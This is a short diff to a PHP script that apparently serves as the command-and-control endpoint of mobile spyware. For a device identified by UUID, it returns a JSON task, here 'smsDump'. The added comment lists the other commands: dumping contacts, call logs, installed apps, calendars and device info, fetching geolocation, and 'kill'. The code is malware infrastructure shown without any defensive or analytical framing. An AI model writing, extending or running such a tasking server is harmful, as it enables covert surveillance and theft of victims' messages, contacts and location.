@@ -4,6 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
 	if (isset($_GET["uuid"]) && !empty($_GET["uuid"])) {
 		$id = sanitize($_GET["uuid"]);
 		if (preg_match("/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i", $id)) {
+			// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump
 			$json = [ 'uuid' => $id, 'task' => 'smsDump' ];
 			header('Content-type:application/json;charset=utf-8');
 			echo json_encode($json);
